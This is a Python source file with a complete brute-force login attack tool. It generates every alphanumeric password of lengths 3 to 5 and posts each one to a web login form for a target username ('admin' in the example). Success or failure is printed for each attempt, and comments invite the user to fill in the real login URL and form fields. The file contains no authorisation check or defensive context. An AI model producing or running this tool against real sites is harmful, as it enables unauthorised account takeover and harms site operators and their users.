import requests
import itertools
import string

class BruteForceLogin:
    def __init__(self, url, username_field, password_field, success_indicator):
        """
        Initialize the BruteForceLogin object.

        Parameters:
        ----------
        url : str
            The URL of the login page to attack.
        username_field : str
            The name attribute of the username input field in the HTML form.
        password_field : str
            The name attribute of the password input field in the HTML form.
        success_indicator : str
            A string that indicates a successful login (e.g., a redirect URL or a specific message in the response).
        """
        self.url = url
        self.username_field = username_field
        self.password_field = password_field
        self.success_indicator = success_indicator

    def attempt_login(self, username, password):
        """
        Attempt to log in with the provided username and password.

        Parameters:
        ----------
        username : str
            The username to use in the login attempt.
        password : str
            The password to use in the login attempt.

        Returns:
        -------
        bool
            True if login was successful, False otherwise.
        """
        data = {
            self.username_field: username,
            self.password_field: password
        }

        response = requests.post(self.url, data=data)

        if self.success_indicator in response.text:
            print(f"[+] Successful login: {username}:{password}")
            return True
        else:
            print(f"[-] Failed login: {username}:{password}")
            return False

    def password_generator(self, length):
        """
        Generate passwords of a specified length using lowercase letters, uppercase letters, and digits.

        Parameters:
        ----------
        length : int
            The length of the passwords to generate.

        Yields:
        -------
        str
            A generated password.
        """
        chars = string.ascii_letters + string.digits
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

    def run_brute_force(self, username, min_length, max_length):
        """
        Run the brute-force attack using generated passwords.

        Parameters:
        ----------
        username : str
            The username to use in the login attempts.
        min_length : int
            The minimum length of the passwords to generate.
        max_length : int
            The maximum length of the passwords to generate.

        Returns:
        -------
        None
        """
        for length in range(min_length, max_length + 1):
            for password in self.password_generator(length):
                if self.attempt_login(username, password):
                    print(f"[!] Brute-force attack successful: {username}:{password}")
                    return  # Stop the attack after a successful login
        print("[!] Brute-force attack completed. No successful logins.")

# Example usage:
if __name__ == "__main__":
    # Configuration
    login_url = "http://example.com/login"  # Replace with the actual login URL
    username_field = "username"  # Replace with the actual name attribute of the username input field
    password_field = "password"  # Replace with the actual name attribute of the password input field
    success_indicator = "Welcome"  # Replace with a string indicating a successful login

    # Create an instance of the BruteForceLogin class
    brute_force = BruteForceLogin(login_url, username_field, password_field, success_indicator)

    # Start the brute-force attack
    target_username = "admin"  # Replace with the target username
    min_password_length = 3  # Replace with the minimum length of the password to generate
    max_password_length = 5  # Replace with the maximum length of the password to generate
    brute_force.run_brute_force(target_username, min_password_length, max_password_length)
